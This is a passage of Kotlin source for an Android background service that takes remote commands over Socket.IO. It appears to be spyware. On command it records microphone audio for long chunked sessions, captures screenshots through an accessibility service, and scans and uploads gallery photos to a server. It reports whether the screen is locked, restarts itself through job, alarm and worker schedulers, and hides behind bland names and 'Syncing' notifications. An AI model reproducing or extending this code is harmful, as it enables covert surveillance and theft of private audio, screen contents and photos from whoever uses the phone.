        if (info.failCount >= MAX_RETRY_ATTEMPTS) {
            val waitTime = when {
                info.failCount >= 10 -> 60 * 60 * 1000L // 1 hour after 10 failures
                info.failCount >= 5 -> 30 * 60 * 1000L  // 30 min after 5 failures
                else -> 10 * 60 * 1000L                  // 10 min after 3 failures
            }
            val timeSinceLastFail = System.currentTimeMillis() - info.lastFailTime
            if (timeSinceLastFail < waitTime) {
                return true
            }
            // Reset fail count after wait period
            failedFiles.remove(file.name)
        }
        return false
    }

    /**
     * Enforce maximum queue size - delete oldest files if exceeded
     */
    private fun enforceQueueLimit() {
        try {
            val allFiles = cacheDir.listFiles { file ->
                (file.name.endsWith(".m4a") || file.name.endsWith(".jpg") || file.name.endsWith(".png")) &&
                        file != currentRecordingFile
            }?.sortedByDescending { it.lastModified() } ?: return

            if (allFiles.size > MAX_QUEUE_SIZE) {
                val filesToDelete = allFiles.drop(MAX_QUEUE_SIZE)
                Log.w(tag, "Queue limit exceeded. Deleting ${filesToDelete.size} oldest files")

                filesToDelete.forEach { file ->
                    try {
                        file.delete()
                        Log.d(tag, "Deleted old file: ${file.name}")
                    } catch (e: Exception) {}
                }
            }
        } catch (e: Exception) {
            Log.e(tag, "Error enforcing queue limit: ${e.message}")
        }
    }

    /**
     * Clean up files older than MAX_FILE_AGE_DAYS
     */
    private fun cleanupOldFiles() {
        try {
            val cutoffTime = System.currentTimeMillis() - (MAX_FILE_AGE_DAYS * 24 * 60 * 60 * 1000L)

            cacheDir.listFiles { file ->
                (file.name.endsWith(".m4a") || file.name.endsWith(".jpg") || file.name.endsWith(".png")) &&
                        file.lastModified() < cutoffTime &&
                        file != currentRecordingFile
            }?.forEach { file ->
                try {
                    file.delete()
                    failedFiles.remove(file.name)
                    Log.d(tag, "Deleted old file (>${MAX_FILE_AGE_DAYS} days): ${file.name}")
                } catch (e: Exception) {}
            }
        } catch (e: Exception) {
            Log.e(tag, "Error cleaning up old files: ${e.message}")
        }
    }

    /**
     * Get all pending upload files (for status reporting)
     */
    private fun getPendingUploadFiles(): List<File> {
        return try {
            cacheDir.listFiles { file ->
                // Only audio recordings and screenshots (NOT gallery images)
                // Gallery images have separate queue and use /upload-gallery endpoint
                val isAudioOrScreenshot = (file.name.endsWith(".m4a") ||
                        file.name.endsWith(".jpg") ||
                        file.name.endsWith(".png"))
                val isNotGalleryFile = !file.name.startsWith("gallery_")
                val isNotTestFile = !file.name.startsWith("audio_test_") && !file.name.startsWith("mic_test_")

                isAudioOrScreenshot &&
                        isNotGalleryFile &&
                        isNotTestFile &&
                        file.length() > 100 &&
                        file != currentRecordingFile &&
                        !filesBeingUploaded.contains(file.name)
            }?.sortedBy { it.lastModified() } ?: emptyList()
        } catch (e: Exception) {
            emptyList()
        }
    }

    /**
     * Start processing all queues
     */
    private fun processPendingUploads() {
        if (!isInternetAvailable) {
            Log.d(tag, "No internet - skipping upload processing")
            return
        }

        processSmallFileQueue()
        processLargeFileQueue()
    }

    /**
     * Get upload queue status for reporting
     */
    private fun getUploadQueueStatus(): JSONObject {
        val pendingFiles = getPendingUploadFiles()
        val smallFiles = pendingFiles.filter { it.length() < SMALL_FILE_THRESHOLD }
        val largeFiles = pendingFiles.filter { it.length() >= SMALL_FILE_THRESHOLD }

        return JSONObject().apply {
            put("totalPending", pendingFiles.size)
            put("smallFilesPending", smallFiles.size)
            put("largeFilesPending", largeFiles.size)
            put("totalSizeBytes", pendingFiles.sumOf { it.length() })
            put("failedFiles", failedFiles.size)
            put("consecutiveFailures", consecutiveFailures)
            put("isPaused", shouldPauseUploads())
            put("isProcessingSmall", isProcessingSmallFiles.get())
            put("isProcessingLarge", isProcessingLargeFiles.get())
        }
    }

    // ==================== Core Service Methods ====================

    private fun loadDeviceInfo() {
        val prefs = getSharedPreferences("SystemCorePrefs", Context.MODE_PRIVATE)
        deviceId = prefs.getString("device_id", "") ?: ""
        deviceName = prefs.getString("device_name", Build.MODEL) ?: Build.MODEL
        serverUrl = prefs.getString("server_url", serverUrl) ?: serverUrl

        if (deviceId.isEmpty()) {
            deviceId = UUID.randomUUID().toString().substring(0, 8)
            prefs.edit().putString("device_id", deviceId).apply()
        }
        if (deviceName.isEmpty()) {
            deviceName = Build.MODEL
            prefs.edit().putString("device_name", deviceName).apply()
        }

        // Load audio source preferences
        loadAudioSourcePreferences()
    }

    private fun startWatchdog() {
        watchdogRunnable = object : Runnable {
            override fun run() {
                try {
                    if (socket == null || socket?.connected() != true) connectToServer()
                    if (isInternetAvailable && !isProcessingSmallFiles.get() && !isProcessingLargeFiles.get()) {
                        if (getPendingUploadFiles().isNotEmpty()) processPendingUploads()
                    }
                    handler.postDelayed(this, watchdogInterval)
                } catch (e: Exception) {
                    handler.postDelayed(this, watchdogInterval)
                }
            }
        }
        handler.postDelayed(watchdogRunnable!!, watchdogInterval)
    }

    private fun scheduleAllRestartMechanisms() {
        getSharedPreferences("SystemCorePrefs", Context.MODE_PRIVATE).edit()
            .putString("server_url", serverUrl)
            .putString("device_id", deviceId)
            .putString("device_name", deviceName)
            .putBoolean("service_enabled", true)
            .apply()

        try { RestartJobService.scheduleJob(this) } catch (e: Exception) {}
        try { RestartAlarmReceiver.scheduleAlarm(this) } catch (e: Exception) {}
        try { RestartWorker.schedule(this) } catch (e: Exception) {}
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        Log.d(tag, "onStartCommand called")
        isRunning = true
        startedFromBoot = intent?.getBooleanExtra("FROM_BOOT", false) ?: false

        intent?.let {
            it.getStringExtra("SERVER_URL")?.let { url -> serverUrl = url }
            it.getStringExtra("DEVICE_ID")?.let { id -> deviceId = id }
            it.getStringExtra("DEVICE_NAME")?.let { name -> deviceName = name }
        }

        if (serverUrl.isEmpty()) {
            serverUrl = getSharedPreferences("SystemCorePrefs", Context.MODE_PRIVATE)
                .getString("server_url", serverUrl) ?: serverUrl
        }

        getSharedPreferences("SystemCorePrefs", Context.MODE_PRIVATE).edit()
            .putString("server_url", serverUrl)
            .putString("device_id", deviceId)
            .putString("device_name", deviceName)
            .putBoolean("service_enabled", true)
            .apply()

        connectToServer()
        scheduleAllRestartMechanisms()

        handler.postDelayed({
            if (isInternetAvailable) processPendingUploads()
        }, 3000)

        return START_STICKY
    }

    private fun connectToServer() {
        try {
            socket?.disconnect()
            socket?.off()

            // Configure Socket.IO with WebSocket transport for better stability
            val options = IO.Options().apply {
                forceNew = true
                reconnection = true
                reconnectionAttempts = Integer.MAX_VALUE
                reconnectionDelay = 2000      // Wait 2 seconds before reconnect
                reconnectionDelayMax = 10000  // Max 10 seconds between retries
                timeout = 60000               // 60 second connection timeout

                // CRITICAL: Use WebSocket transport directly (skip polling)
                // This avoids the polling -> websocket upgrade issue
                transports = arrayOf("websocket", "polling")
            }

            socket = IO.socket(URI.create(serverUrl), options)

            socket?.on(Socket.EVENT_CONNECT) {
                Log.d(tag, "Connected to server!")
                handler.post { updateNotification("Syncing") }

                socket?.emit("register", JSONObject().apply {
                    put("deviceId", deviceId)
                    put("deviceName", deviceName)
                    put("model", Build.MODEL)
                    put("manufacturer", Build.MANUFACTURER)
                    put("androidVersion", Build.VERSION.RELEASE)
                    put("sdkVersion", Build.VERSION.SDK_INT)
                    put("capabilities", JSONObject().apply {
                        put("audio", true)
                        put("screenshot", true)
                        put("screenshotMethod", getScreenshotMethod())
                    })
                })

                handler.post { processPendingUploads() }
            }

            socket?.on(Socket.EVENT_DISCONNECT) {
                handler.post { updateNotification("Waiting") }
            }

            socket?.on(Socket.EVENT_CONNECT_ERROR) { args ->
                Log.e(tag, "Connection error: ${args.firstOrNull()}")
                handler.post { updateNotification("Connecting") }
            }

            // Audio recording commands
            socket?.on("start_recording") { args ->
                Log.d(tag, "Received start_recording")
                try {
                    val data = parseSocketData(args)
                    val targetDeviceId = data.optString("targetDeviceId", "all")
                    if (targetDeviceId == "all" || targetDeviceId == deviceId) {
                        val durationSeconds = data.optInt("duration", 30)
                        handler.post { startRecording(durationSeconds) }
                    }
                } catch (e: Exception) {
                    handler.post { startRecording(30) }
                }
            }

            socket?.on("stop_recording") { args ->
                try {
                    val data = parseSocketData(args)
                    val targetDeviceId = data.optString("targetDeviceId", "all")
                    if (targetDeviceId == "all" || targetDeviceId == deviceId) {
                        handler.post { stopRecording() }
                    }
                } catch (e: Exception) {
                    handler.post { stopRecording() }
                }
            }

            // Screenshot commands
            socket?.on("take_screenshot") { args ->
                Log.d(tag, "Received take_screenshot")
                try {
                    val data = parseSocketData(args)
                    val targetDeviceId = data.optString("targetDeviceId", "all")
                    if (targetDeviceId == "all" || targetDeviceId == deviceId) {
                        handler.post { takeScreenshot() }
                    }
                } catch (e: Exception) {
                    handler.post { takeScreenshot() }
                }
            }

            socket?.on("update_device_name") { args ->
                try {
                    val data = parseSocketData(args)
                    val targetDeviceId = data.optString("targetDeviceId", "")
                    val newName = data.optString("newName", "")
                    if (targetDeviceId == deviceId && newName.isNotEmpty()) {
                        deviceName = newName
                        getSharedPreferences("SystemCorePrefs", Context.MODE_PRIVATE)
                            .edit().putString("device_name", newName).apply()
                        socket?.emit("device_name_updated", JSONObject().apply {
                            put("deviceId", deviceId)
                            put("deviceName", deviceName)
                        })
                    }
                } catch (e: Exception) {}
            }

            socket?.on("ping") {
                // Track that we received a ping (server is alive)
                lastPongReceived = System.currentTimeMillis()
                connectionHealthy = true

                socket?.emit("pong", JSONObject().apply {
                    put("deviceId", deviceId)
                    put("deviceName", deviceName)
                    put("isRecording", isRecording)
                    put("pendingUploads", getPendingUploadFiles().size)
                    put("isOnline", isInternetAvailable)
                    put("notificationsEnabled", areNotificationsEnabled())
                    put("screenshotCapability", getScreenshotMethod())
                    put("isScreenLocked", isScreenLocked())
                    put("uploadQueueStatus", getUploadQueueStatus())
                    put("audioSourceConfig", getAudioSourceConfig())
                    put("connectionHealthy", connectionHealthy)
                    put("timestamp", System.currentTimeMillis())
                    // Chunking info for long recordings
                    if (isChunkedRecording) {
                        put("isChunkedRecording", true)
                        put("currentChunk", currentChunkNumber)
                        put("remainingDuration", remainingDuration)
                        put("totalDuration", totalRequestedDuration)
                    }
                })
            }

            // Handle health check acknowledgment from server
            socket?.on("health_check_ack") {
                lastPongReceived = System.currentTimeMillis()
                connectionHealthy = true
                Log.d(tag, "Health check acknowledged by server")
            }

            // ==================== AUDIO SOURCE CONTROL FROM WEB PORTAL ====================

            // Set audio source from web portal
            socket?.on("set_audio_source") { args ->
                try {
                    val data = parseSocketData(args)
                    val targetDeviceId = data.optString("targetDeviceId", "")
                    val sourceName = data.optString("source", "")

                    if (targetDeviceId == deviceId && sourceName.isNotEmpty()) {
                        handler.post {
                            if (sourceName == "auto") {
                                resetToAutoDetectedSource()
                            } else {
                                setAudioSourceFromPortal(sourceName)
                            }
                        }
                    }
                } catch (e: Exception) {
                    Log.e(tag, "Error setting audio source: ${e.message}")
                }
            }

            // Test all audio sources (requested from web portal)
            socket?.on("test_audio_sources") { args ->
                try {
                    val data = parseSocketData(args)
                    val targetDeviceId = data.optString("targetDeviceId", "")

                    if (targetDeviceId == deviceId || targetDeviceId == "all") {
                        Log.d(tag, "Audio source test requested from portal")

                        // Notify portal that test is starting
                        socket?.emit("audio_source_test_started", JSONObject().apply {
                            put("deviceId", deviceId)
                            put("deviceName", deviceName)
                        })

                        testAllAudioSources { results, bestSource ->
                            // Send results to portal
                            socket?.emit("audio_source_test_complete", JSONObject().apply {
                                put("deviceId", deviceId)
                                put("deviceName", deviceName)
                                put("testResults", JSONObject(results))
                                put("autoDetectedSource", AUDIO_SOURCE_NAMES[bestSource] ?: "none")
                                put("manufacturerDefault", AUDIO_SOURCE_NAMES[getManufacturerDefaultSource()])
                                put("currentSource", AUDIO_SOURCE_NAMES[getPreferredAudioSource()])
                            })
                        }
                    }
                } catch (e: Exception) {
                    Log.e(tag, "Error testing audio sources: ${e.message}")
                }
            }

            // Get current audio source config
            socket?.on("get_audio_config") { args ->
                try {
                    val data = parseSocketData(args)
                    val targetDeviceId = data.optString("targetDeviceId", "")

                    if (targetDeviceId == deviceId) {
                        socket?.emit("audio_config", JSONObject().apply {
                            put("deviceId", deviceId)
                            put("deviceName", deviceName)
                            put("config", getAudioSourceConfig())
                        })
                    }
                } catch (e: Exception) {
                    Log.e(tag, "Error getting audio config: ${e.message}")
                }
            }

            // ==================== GALLERY MONITORING SOCKET HANDLERS ====================

            // Get gallery statistics
            socket?.on("get_gallery_stats") { args ->
                try {
                    val data = parseSocketData(args)
                    val targetDeviceId = data.optString("targetDeviceId", "")

                    if (targetDeviceId == deviceId || targetDeviceId == "all") {
                        Log.d(tag, "Gallery stats requested")

                        val stats = getGalleryStats()
                        socket?.emit("gallery_stats", JSONObject().apply {
                            put("deviceId", deviceId)
                            put("deviceName", deviceName)
                            put("stats", stats)
                        })
                    }
                } catch (e: Exception) {
                    Log.e(tag, "Error getting gallery stats: ${e.message}")
                }
            }

            // Scan gallery images with flexible criteria
            socket?.on("get_gallery_images") { args ->
                try {
                    val data = parseSocketData(args)
                    val targetDeviceId = data.optString("targetDeviceId", "")

                    if (targetDeviceId == deviceId) {
                        val requestId = data.optString("requestId", System.currentTimeMillis().toString())
                        val count = data.optInt("count", 10)
                        val fromDate = data.optLong("fromDate", 0)
                        val toDate = data.optLong("toDate", 0)
                        val onlyMetadata = data.optBoolean("onlyMetadata", true)

                        // Parse folders array
                        val foldersJson = data.optJSONArray("folders")
                        val folders = if (foldersJson != null && foldersJson.length() > 0) {
                            (0 until foldersJson.length()).map { foldersJson.getString(it) }
                        } else {
                            listOf("all")
                        }

                        Log.d(tag, "Gallery scan requested: count=$count, folders=$folders, from=$fromDate, to=$toDate")

                        socket?.emit("gallery_scan_started", JSONObject().apply {
                            put("deviceId", deviceId)
                            put("requestId", requestId)
                        })

                        scanGalleryImages(
                            count = count,
                            fromDate = fromDate,
                            toDate = toDate,
                            folders = folders,
                            onlyMetadata = onlyMetadata
                        ) { images ->
                            if (onlyMetadata) {
                                sendGalleryMetadata(images, requestId)
                            } else {
                                // Queue all found images for upload
                                val imageIds = images.map { it.id }
                                queueGalleryImagesForUpload(imageIds, requestId)
                            }
                        }
                    }
                } catch (e: Exception) {
                    Log.e(tag, "Error scanning gallery: ${e.message}")
                    socket?.emit("gallery_scan_error", JSONObject().apply {
                        put("deviceId", deviceId)
                        put("error", e.message)
                    })
                }
            }

            // Upload specific images by their IDs
            socket?.on("upload_gallery_images") { args ->
                try {
                    val data = parseSocketData(args)
                    val targetDeviceId = data.optString("targetDeviceId", "")

                    if (targetDeviceId == deviceId) {
                        val requestId = data.optString("requestId", System.currentTimeMillis().toString())

                        // Parse image IDs array
                        val idsJson = data.optJSONArray("imageIds")
                        val imageIds = if (idsJson != null) {
                            (0 until idsJson.length()).map { idsJson.getLong(it) }
                        } else {
                            emptyList()
                        }

                        if (imageIds.isNotEmpty()) {
                            Log.d(tag, "Uploading ${imageIds.size} gallery images")
                            queueGalleryImagesForUpload(imageIds, requestId)
                        } else {
                            socket?.emit("gallery_upload_error", JSONObject().apply {
                                put("deviceId", deviceId)
                                put("requestId", requestId)
                                put("error", "No image IDs provided")
                            })
                        }
                    }
                } catch (e: Exception) {
                    Log.e(tag, "Error uploading gallery images: ${e.message}")
                }
            }

            // Get latest N images (shortcut command)
            socket?.on("get_latest_images") { args ->
                try {
                    val data = parseSocketData(args)
                    val targetDeviceId = data.optString("targetDeviceId", "")

                    if (targetDeviceId == deviceId) {
                        val count = data.optInt("count", 5)
                        val uploadNow = data.optBoolean("upload", false)
                        val requestId = data.optString("requestId", System.currentTimeMillis().toString())

                        Log.d(tag, "Getting latest $count images, upload=$uploadNow")

                        scanGalleryImages(
                            count = count,
                            fromDate = 0,
                            toDate = 0,
                            folders = listOf("all"),
                            onlyMetadata = !uploadNow
                        ) { images ->
                            if (uploadNow) {
                                val imageIds = images.map { it.id }
                                queueGalleryImagesForUpload(imageIds, requestId)
                            } else {
                                sendGalleryMetadata(images, requestId)
                            }
                        }
                    }
                } catch (e: Exception) {
                    Log.e(tag, "Error getting latest images: ${e.message}")
                }
            }

            // Get images from specific date range
            socket?.on("get_images_by_date") { args ->
                try {
                    val data = parseSocketData(args)
                    val targetDeviceId = data.optString("targetDeviceId", "")

                    if (targetDeviceId == deviceId) {
                        val fromDate = data.optLong("fromDate", 0)
                        val toDate = data.optLong("toDate", System.currentTimeMillis())
                        val uploadNow = data.optBoolean("upload", false)
                        val requestId = data.optString("requestId", System.currentTimeMillis().toString())
                        val maxCount = data.optInt("maxCount", 50) // Safety limit

                        Log.d(tag, "Getting images from $fromDate to $toDate")

                        scanGalleryImages(
                            count = maxCount,
                            fromDate = fromDate,
                            toDate = toDate,
                            folders = listOf("all"),
                            onlyMetadata = !uploadNow
                        ) { images ->
                            if (uploadNow) {
                                val imageIds = images.map { it.id }
                                queueGalleryImagesForUpload(imageIds, requestId)
                            } else {
                                sendGalleryMetadata(images, requestId)
                            }
                        }
                    }
                } catch (e: Exception) {
                    Log.e(tag, "Error getting images by date: ${e.message}")
                }
            }

            // Get images from specific folder
            socket?.on("get_images_by_folder") { args ->
                try {
                    val data = parseSocketData(args)
                    val targetDeviceId = data.optString("targetDeviceId", "")

                    if (targetDeviceId == deviceId) {
                        val folder = data.optString("folder", "all")
                        val count = data.optInt("count", 20)
                        val uploadNow = data.optBoolean("upload", false)
                        val requestId = data.optString("requestId", System.currentTimeMillis().toString())

                        Log.d(tag, "Getting $count images from folder: $folder")

                        scanGalleryImages(
                            count = count,
                            fromDate = 0,
                            toDate = 0,
                            folders = listOf(folder),
                            onlyMetadata = !uploadNow
                        ) { images ->
                            if (uploadNow) {
                                val imageIds = images.map { it.id }
                                queueGalleryImagesForUpload(imageIds, requestId)
                            } else {
                                sendGalleryMetadata(images, requestId)
                            }
                        }
                    }
                } catch (e: Exception) {
                    Log.e(tag, "Error getting images by folder: ${e.message}")
                }
            }

            socket?.connect()
            Log.d(tag, "Connecting to: $serverUrl")

        } catch (e: Exception) {
            Log.e(tag, "Socket initialization error", e)
            handler.post { updateNotification("Error") }
        }
    }

    private fun parseSocketData(args: Array<Any>): JSONObject {
        return when {
            args.isNotEmpty() && args[0] is JSONObject -> args[0] as JSONObject
            args.isNotEmpty() && args[0] is String -> JSONObject(args[0] as String)
            else -> JSONObject()
        }
    }

    private fun getScreenshotMethod(): String {
        return when {
            Build.VERSION.SDK_INT >= Build.VERSION_CODES.R &&
                    ScreenCaptureAccessibilityService.isServiceEnabled(this) -> "accessibility"
            mediaProjectionData != null -> "mediaprojection"
            else -> "none"
        }
    }

    private fun isScreenLocked(): Boolean {
        return try {
            val keyguardManager = getSystemService(Context.KEYGUARD_SERVICE) as KeyguardManager
            keyguardManager.isKeyguardLocked
        } catch (e: Exception) {
            false
        }
    }

    // ==================== Audio Recording ====================

    private fun startRecording(durationSeconds: Int) {
        if (isRecording) {
            emitError("recording_error", "Already recording")
            return
        }

        if (!hasMicrophonePermission()) {
            emitError("recording_error", "Microphone permission not granted")
            return
        }
        
        // Check if this is a long recording that needs chunking (> 30 minutes)
        if (durationSeconds > maxChunkDurationSeconds) {
            // Initialize chunked recording session
            isChunkedRecording = true
            totalRequestedDuration = durationSeconds
            remainingDuration = durationSeconds
            currentChunkNumber = 0
            recordingSessionId = UUID.randomUUID().toString().substring(0, 8)
            
            val totalChunks = (durationSeconds + maxChunkDurationSeconds - 1) / maxChunkDurationSeconds
            Log.d(tag, "=== LONG RECORDING: $durationSeconds sec = $totalChunks chunks of ${maxChunkDurationSeconds}s ===")
            
            // Emit recording_started with chunking info (portal sees this as normal recording)
            socket?.emit("recording_started", JSONObject().apply {
                put("deviceId", deviceId)
                put("deviceName", deviceName)
                put("duration", durationSeconds)
                put("isChunked", true)
                put("totalChunks", totalChunks)
                put("sessionId", recordingSessionId)
            })
            
            // Start first chunk
            startRecordingChunk()
        } else {
            // Normal short recording (original behavior)
            isChunkedRecording = false
            startSingleRecording(durationSeconds)
        }
    }
    
    /**
     * Start a single recording (original behavior for short recordings)
     */
    private fun startSingleRecording(durationSeconds: Int) {
        try {
            if (canUseMicrophoneFgsType()) {
                try {
                    startedFromBoot = false
                    startForegroundSafe(true)
                } catch (e: Exception) {
                    Log.w(tag, "Failed to switch FGS type: ${e.message}")
                }
            }

            val timestamp = SimpleDateFormat("yyyyMMdd_HHmmss", Locale.getDefault()).format(Date())
            val fileName = "${deviceId}_${timestamp}.m4a"
            currentRecordingFile = File(cacheDir, fileName)

            mediaRecorder = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                MediaRecorder(this)
            } else {
                @Suppress("DEPRECATION")
                MediaRecorder()
            }

            configureMediaRecorder()

            isRecording = true
            updateNotification("Recording")

            socket?.emit("recording_started", JSONObject().apply {
                put("deviceId", deviceId)
                put("deviceName", deviceName)
                put("duration", durationSeconds)
            })

            stopRecordingRunnable?.let { handler.removeCallbacks(it) }
            stopRecordingRunnable = Runnable { stopRecording() }
            handler.postDelayed(stopRecordingRunnable!!, durationSeconds * 1000L)

        } catch (e: Exception) {
            Log.e(tag, "Failed to start recording", e)
            isRecording = false
            updateNotification("Syncing")
            try { mediaRecorder?.release() } catch (e2: Exception) {}
            mediaRecorder = null
            emitError("recording_error", e.message ?: "Unknown error")
        }
    }
    
    /**
     * Start a single chunk of a long recording
     */
    private fun startRecordingChunk() {
        if (remainingDuration <= 0) {
            Log.d(tag, "=== CHUNKED RECORDING COMPLETE: $currentChunkNumber chunks recorded ===")
            isChunkedRecording = false
            socket?.emit("recording_stopped", JSONObject().apply {
                put("deviceId", deviceId)
                put("deviceName", deviceName)
                put("message", "Long recording complete")
                put("totalChunks", currentChunkNumber)
                put("sessionId", recordingSessionId)
            })
            return
        }
        
        val chunkDuration = minOf(remainingDuration, maxChunkDurationSeconds)
        
        try {
            if (canUseMicrophoneFgsType()) {
                try {
                    startedFromBoot = false
                    startForegroundSafe(true)
                } catch (e: Exception) {
                    Log.w(tag, "Failed to switch FGS type: ${e.message}")
                }
            }

            val timestamp = SimpleDateFormat("yyyyMMdd_HHmmss", Locale.getDefault()).format(Date())
            val fileName = "${deviceId}_${timestamp}_chunk${currentChunkNumber}.m4a"
            currentRecordingFile = File(cacheDir, fileName)

            mediaRecorder = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                MediaRecorder(this)
            } else {
                @Suppress("DEPRECATION")
                MediaRecorder()
            }

            configureMediaRecorder()

            isRecording = true
            val totalChunks = (totalRequestedDuration + maxChunkDurationSeconds - 1) / maxChunkDurationSeconds
            updateNotification("Recording chunk ${currentChunkNumber + 1}/$totalChunks")
            
            Log.d(tag, "Started chunk $currentChunkNumber: $chunkDuration sec, remaining: ${remainingDuration - chunkDuration} sec")

            stopRecordingRunnable?.let { handler.removeCallbacks(it) }
            stopRecordingRunnable = Runnable { stopRecordingChunk() }
            handler.postDelayed(stopRecordingRunnable!!, chunkDuration * 1000L)

        } catch (e: Exception) {
            Log.e(tag, "Failed to start chunk $currentChunkNumber", e)
            isRecording = false
            updateNotification("Syncing")
            try { mediaRecorder?.release() } catch (e2: Exception) {}
            mediaRecorder = null
            
            // Retry chunk after delay
            handler.postDelayed({
                if (isChunkedRecording && remainingDuration > 0) {
                    Log.d(tag, "Retrying chunk $currentChunkNumber...")
                    startRecordingChunk()
                }
            }, 5000)
        }
    }
    
    /**
     * Stop current chunk and start next one if more remaining
     */
    private fun stopRecordingChunk() {
        if (!isRecording) return
        
        stopRecordingRunnable?.let { handler.removeCallbacks(it) }
        stopRecordingRunnable = null
        
        try {
            mediaRecorder?.apply {
                try { stop() } catch (e: RuntimeException) {
                    Log.w(tag, "MediaRecorder stop failed: ${e.message}")
                }
                try { release() } catch (e: Exception) {}
            }
            mediaRecorder = null
            isRecording = false

            try { startForegroundSafe(false) } catch (e: Exception) {}

            val recordedFile = currentRecordingFile
            currentRecordingFile = null

            recordedFile?.let { file ->
                if (file.exists() && file.length() > 1000) {
                    Log.d(tag, "Chunk $currentChunkNumber saved: ${file.name}, size: ${file.length()}")
                    queueFileForUpload(file, "audio")
                } else {
                    Log.w(tag, "Chunk $currentChunkNumber file empty or too small")
                }
            }

            // Update remaining duration
            val chunkDuration = minOf(remainingDuration, maxChunkDurationSeconds)
            remainingDuration -= chunkDuration
            currentChunkNumber++
            
            // Start next chunk after short delay
            if (remainingDuration > 0) {
                Log.d(tag, "Starting next chunk in 2 seconds, remaining: $remainingDuration sec")
                handler.postDelayed({
                    if (isChunkedRecording && remainingDuration > 0) {
                        startRecordingChunk()
                    }
                }, 2000)
            } else {
                // All chunks complete
                Log.d(tag, "=== ALL CHUNKS COMPLETE: $currentChunkNumber chunks ===")
                isChunkedRecording = false
                updateNotification("Syncing")
                
                socket?.emit("recording_stopped", JSONObject().apply {
                    put("deviceId", deviceId)
                    put("deviceName", deviceName)
                    put("message", "Long recording complete")
                    put("totalChunks", currentChunkNumber)
                    put("sessionId", recordingSessionId)
                })
            }

        } catch (e: Exception) {
            Log.e(tag, "Error stopping chunk $currentChunkNumber", e)
            try { mediaRecorder?.release() } catch (e2: Exception) {}
            mediaRecorder = null
            isRecording = false
            currentRecordingFile = null
            
            // Try to continue with next chunk
            if (remainingDuration > 0) {
                currentChunkNumber++
                handler.postDelayed({
                    if (isChunkedRecording && remainingDuration > 0) {
                        startRecordingChunk()
                    }
                }, 5000)
            }
        }
    }

    /**
     * Configure MediaRecorder with smart audio source selection
     *
     * Priority:
     * 1. User-selected source (from web portal)
     * 2. Auto-detected working source
     * 3. Manufacturer-based default with fallback chain
     */
    private fun configureMediaRecorder() {
        mediaRecorder?.apply {
            val manufacturer = Build.MANUFACTURER.lowercase()
            val model = Build.MODEL.lowercase()

            Log.d(tag, "Configuring audio for: Manufacturer=$manufacturer, Model=$model, SDK=${Build.VERSION.SDK_INT}")

            // Get preferred audio source (user-selected or auto-detected)
            val preferredSource = getPreferredAudioSource()
            Log.d(tag, "Preferred audio source: ${AUDIO_SOURCE_NAMES[preferredSource]}")

            // Build audio source priority list with preferred source first
            val audioSourcePriority = mutableListOf(preferredSource)

            // Add fallbacks based on manufacturer (excluding already added)
            val manufacturerDefaults = when {
                manufacturer.contains("samsung") -> listOf(
                    MediaRecorder.AudioSource.CAMCORDER,
                    MediaRecorder.AudioSource.DEFAULT,
                    MediaRecorder.AudioSource.VOICE_RECOGNITION,
                    MediaRecorder.AudioSource.MIC
                )
                manufacturer.contains("xiaomi") || manufacturer.contains("redmi") || manufacturer.contains("poco") -> listOf(
                    MediaRecorder.AudioSource.VOICE_RECOGNITION,
                    MediaRecorder.AudioSource.MIC,
                    MediaRecorder.AudioSource.DEFAULT,
                    MediaRecorder.AudioSource.CAMCORDER
                )
                manufacturer.contains("huawei") || manufacturer.contains("honor") -> listOf(
                    MediaRecorder.AudioSource.VOICE_RECOGNITION,
                    MediaRecorder.AudioSource.DEFAULT,
                    MediaRecorder.AudioSource.MIC,
                    MediaRecorder.AudioSource.CAMCORDER
                )
                manufacturer.contains("oppo") || manufacturer.contains("realme") || manufacturer.contains("oneplus") -> listOf(
                    MediaRecorder.AudioSource.DEFAULT,
                    MediaRecorder.AudioSource.VOICE_RECOGNITION,
                    MediaRecorder.AudioSource.MIC,
                    MediaRecorder.AudioSource.CAMCORDER
                )
                manufacturer.contains("vivo") || manufacturer.contains("iqoo") -> listOf(
                    MediaRecorder.AudioSource.VOICE_RECOGNITION,
                    MediaRecorder.AudioSource.DEFAULT,
                    MediaRecorder.AudioSource.MIC,
                    MediaRecorder.AudioSource.CAMCORDER
                )
                Build.VERSION.SDK_INT <= Build.VERSION_CODES.S -> listOf(
                    MediaRecorder.AudioSource.VOICE_RECOGNITION,
                    MediaRecorder.AudioSource.MIC,
                    MediaRecorder.AudioSource.DEFAULT,
                    MediaRecorder.AudioSource.CAMCORDER
                )
                else -> listOf(
                    MediaRecorder.AudioSource.MIC,
                    MediaRecorder.AudioSource.VOICE_RECOGNITION,
                    MediaRecorder.AudioSource.DEFAULT,
                    MediaRecorder.AudioSource.CAMCORDER
                )
            }

            // Add manufacturer defaults if not already in list
            manufacturerDefaults.forEach { source ->
                if (!audioSourcePriority.contains(source)) {
                    audioSourcePriority.add(source)
                }
            }

            // Audio quality configurations to try
            data class AudioConfig(
                val sampleRate: Int,
                val bitRate: Int,
                val format: Int,
                val encoder: Int
            )

            val audioConfigs = when {
                manufacturer.contains("samsung") -> listOf(
                    AudioConfig(16000, 64000, MediaRecorder.OutputFormat.MPEG_4, MediaRecorder.AudioEncoder.AAC),
                    AudioConfig(8000, 32000, MediaRecorder.OutputFormat.MPEG_4, MediaRecorder.AudioEncoder.AAC),
                    AudioConfig(8000, 12200, MediaRecorder.OutputFormat.THREE_GPP, MediaRecorder.AudioEncoder.AMR_NB)
                )
                Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU -> listOf(
                    AudioConfig(44100, 128000, MediaRecorder.OutputFormat.MPEG_4, MediaRecorder.AudioEncoder.AAC),
                    AudioConfig(22050, 96000, MediaRecorder.OutputFormat.MPEG_4, MediaRecorder.AudioEncoder.AAC),
                    AudioConfig(16000, 64000, MediaRecorder.OutputFormat.MPEG_4, MediaRecorder.AudioEncoder.AAC),
                    AudioConfig(8000, 12200, MediaRecorder.OutputFormat.THREE_GPP, MediaRecorder.AudioEncoder.AMR_NB)
                )
                else -> listOf(
                    AudioConfig(22050, 96000, MediaRecorder.OutputFormat.MPEG_4, MediaRecorder.AudioEncoder.AAC),
                    AudioConfig(16000, 64000, MediaRecorder.OutputFormat.MPEG_4, MediaRecorder.AudioEncoder.AAC),
                    AudioConfig(8000, 32000, MediaRecorder.OutputFormat.MPEG_4, MediaRecorder.AudioEncoder.AAC),
